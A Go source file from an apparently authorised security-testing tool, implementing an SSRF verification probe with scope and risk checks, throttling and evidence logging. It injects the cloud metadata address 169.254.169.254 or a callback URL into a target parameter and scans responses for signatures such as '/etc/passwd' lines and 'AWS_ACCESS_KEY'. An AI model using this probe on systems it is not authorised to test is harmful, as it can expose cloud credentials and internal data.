package verify

import (
	"fmt"
	"net/url"
	"os"
	"strings"

	"github.com/srank-org/ensphere/internal/evidence"
)

// SSRFConfig holds configuration for SSRF verification.
type SSRFConfig struct {
	URL         string
	Param       string
	CallbackURL string // optional external callback URL
	Method      string // GET or POST
	ProbeConfig
}

// Internal metadata signatures that indicate SSRF success.
var internalSignatures = []string{
	"latest/meta-data",
	"computeMetadata",
	"metadata/instance",
	"127.0.0.1",
	"root:x:0:0",
	"AWS_ACCESS_KEY",
}

// VerifySSRF runs the SSRF verification probe.
func VerifySSRF(cfg SSRFConfig) (*ProbeResult, error) {
	if err := CheckScope(cfg.URL, cfg.InScope); err != nil {
		return nil, err
	}

	if err := CheckMaxRisk(3, cfg.MaxRisk); err != nil {
		return nil, err
	}

	timer := NewTimer()
	throttle := NewThrottle(cfg.ThrottleMs)

	var ew *evidence.Writer
	if cfg.Evidence != "" {
		var err error
		ew, err = evidence.NewWriter(cfg.Evidence)
		if err != nil {
			fmt.Fprintf(os.Stderr, "Warning: could not open evidence file: %v\n", err)
		} else {
			defer ew.Close()
		}
	}

	probeCount := 0

	// Baseline: inject a safe external URL
	throttle.Wait()
	probeCount++
	baselineResp := ssrfProbeWithParam(cfg, "https://example.com")
	if baselineResp.Error != nil {
		return nil, fmt.Errorf("baseline probe: %w", baselineResp.Error)
	}
	fmt.Fprintf(os.Stderr, "[BASELINE] status=%d hash=%s\n", baselineResp.StatusCode, baselineResp.BodyHash[:16])
	writeEvidence(ew, "ssrf", "metadata_access", cfg.URL, cfg.Param, baselineResp.StatusCode,
		fmt.Sprintf("%dms", baselineResp.ElapsedMs), "baseline", "injected https://example.com")

	// Probe: inject internal URL or callback
	probeURL := "http://169.254.169.254/latest/meta-data/"
	if cfg.CallbackURL != "" {
		probeURL = cfg.CallbackURL
	}

	throttle.Wait()
	probeCount++
	probeResp := ssrfProbeWithParam(cfg, probeURL)
	if probeResp.Error != nil {
		return nil, fmt.Errorf("ssrf probe: %w", probeResp.Error)
	}
	fmt.Fprintf(os.Stderr, "[PROBE] status=%d hash=%s\n", probeResp.StatusCode, probeResp.BodyHash[:16])
	writeEvidence(ew, "ssrf", "metadata_access", cfg.URL, cfg.Param, probeResp.StatusCode,
		fmt.Sprintf("%dms", probeResp.ElapsedMs), "probe", fmt.Sprintf("injected %s", probeURL))

	var matchedSignatures []string
	for _, sig := range internalSignatures {
		if strings.Contains(probeResp.Body, sig) {
			matchedSignatures = append(matchedSignatures, sig)
		}
	}
	hashesMatch := baselineResp.BodyHash == probeResp.BodyHash
	snippet := probeResp.Body
	if len(snippet) > 500 {
		snippet = snippet[:500]
	}

	baseline := RoundResult{
		StatusCode: baselineResp.StatusCode,
		ElapsedMs:  baselineResp.ElapsedMs,
		BodyHash:   baselineResp.BodyHash,
		BodyLength: len(baselineResp.Body),
	}
	probe := RoundResult{
		StatusCode: probeResp.StatusCode,
		ElapsedMs:  probeResp.ElapsedMs,
		BodyHash:   probeResp.BodyHash,
		BodyLength: len(probeResp.Body),
	}

	return &ProbeResult{
		VulnType:   "ssrf",
		Technique:  "metadata_access",
		StartedAt:  timer.StartedAt(),
		ProbeCount: probeCount,
		Duration:   timer.Elapsed(),
		Measurements: SSRFMeasurements{
			Baseline:          baseline,
			Probe:             probe,
			HashesMatch:       hashesMatch,
			MatchedSignatures: matchedSignatures,
			CallbackURL:       cfg.CallbackURL,
			PayloadUsed:       probeURL,
			ResponseSnippet:   snippet,
		},
	}, nil
}

// ssrfProbeWithParam injects a URL value into the target parameter.
func ssrfProbeWithParam(cfg SSRFConfig, value string) ProbeResponse {
	if strings.ToUpper(cfg.Method) == "POST" {
		body := url.Values{cfg.Param: {value}}.Encode()
		headers := make(map[string]string)
		for k, v := range cfg.Headers {
			headers[k] = v
		}
		headers["Content-Type"] = "application/x-www-form-urlencoded"
		return HTTPProbe("POST", cfg.URL, body, headers, cfg.TimeoutSec, cfg.InScope)
	}
	parsed, err := url.Parse(cfg.URL)
	if err != nil {
		return ProbeResponse{Error: fmt.Errorf("parse URL: %w", err)}
	}
	params := parsed.Query()
	params.Set(cfg.Param, value)
	parsed.RawQuery = params.Encode()
	return HTTPProbe(cfg.Method, parsed.String(), "", cfg.Headers, cfg.TimeoutSec, cfg.InScope)
}
